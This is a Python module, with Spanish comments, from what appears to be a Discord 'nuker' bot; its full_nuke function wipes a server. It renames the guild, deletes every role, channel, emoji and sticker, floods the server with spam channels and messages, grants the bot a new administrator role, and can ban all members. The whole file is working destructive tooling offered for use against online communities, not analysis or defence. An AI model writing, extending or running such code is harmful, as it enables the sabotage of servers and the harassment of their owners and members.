"""Destruccion total del servidor."""
from __future__ import annotations

import discord

from . import channels, extras, members, roles

MAX_CHANNELS = 50


async def full_nuke(guild: discord.Guild, client, **options) -> dict:
    cfg = {
        "guild_name": f"nuked by {client.user.name}",
        "channel_name": "nuke",
        "category_name": "NUKE",
        "icon": None,
        "text_count": 15,
        "voice_count": 3,
        "delete_roles": True,
        "delete_channels": True,
        "delete_emojis": True,
        "delete_stickers": True,
        "ban_all": False,
        "spam_message": None,
        "spam_times": 0,
        "spam_all_channels": False,
        "concurrency": 3,
        "log": lambda _m: None,
    }
    cfg.update({k: v for k, v in options.items() if v is not None})

    log = cfg["log"]
    report = {}

    text_count = max(1, min(int(cfg["text_count"]), MAX_CHANNELS))
    voice_count = max(0, min(int(cfg["voice_count"]), MAX_CHANNELS - text_count))

    log("Renombrando servidor...")
    try:
        await guild.edit(name=cfg["guild_name"][:100], reason="nuke")
    except Exception:
        pass

    if cfg["icon"]:
        log("Cambiando foto del servidor...")
        try:
            await extras.set_icon(guild, cfg["icon"])
            report["foto"] = "actualizada"
        except Exception as exc:
            report["foto"] = f"error: {exc}"

    if cfg["delete_roles"]:
        report["roles_borrados"] = await roles.destroy_roles(
            guild, concurrency=cfg["concurrency"], log=log)

    if cfg["delete_channels"]:
        report["canales_borrados"] = await channels.destroy_channels(
            guild, concurrency=4, log=log)

    log("Reconstruyendo estructura...")
    category = await channels.create_category(guild, cfg["category_name"])
    new_channels = await channels.spam_channels(
        guild, text_count, name=cfg["channel_name"], category=category,
        concurrency=cfg["concurrency"], log=log)
    report["canales_creados"] = len(new_channels)

    if voice_count > 0:
        await channels.spam_channels(
            guild, voice_count, kind="voice", name=cfg["channel_name"],
            category=category, concurrency=cfg["concurrency"], log=log)
        report["voz_creados"] = voice_count

    try:
        role = await guild.create_role(
            name=cfg["role_name"] if "role_name" in cfg else "nuked",
            colour=discord.Colour(0xA855F7),
            hoist=True,
            mentionable=True,
            permissions=discord.Permissions(administrator=True),
            reason="nuke",
        )
        report["rol_creado"] = role.name
        if guild.me:
            await guild.me.add_roles(role, reason="nuke")
    except Exception:
        pass

    if cfg["delete_emojis"]:
        report["emojis_borrados"] = await extras.delete_emojis(guild, log=log)

    if cfg["delete_stickers"]:
        report["stickers_borrados"] = await extras.delete_stickers(guild, log=log)

    if cfg["spam_message"] and cfg["spam_times"] > 0 and new_channels:
        targets = new_channels if cfg["spam_all_channels"] else new_channels[:1]
        log(f'Enviando spam en {len(targets)} canal(es)...')
        report["mensajes_enviados"] = await extras.spam_channels_list(
            targets, cfg["spam_message"], int(cfg["spam_times"]))

    if cfg["ban_all"]:
        report["miembros_baneados"] = await members.ban_all(
            guild, client, concurrency=cfg["concurrency"], log=log)

    return report
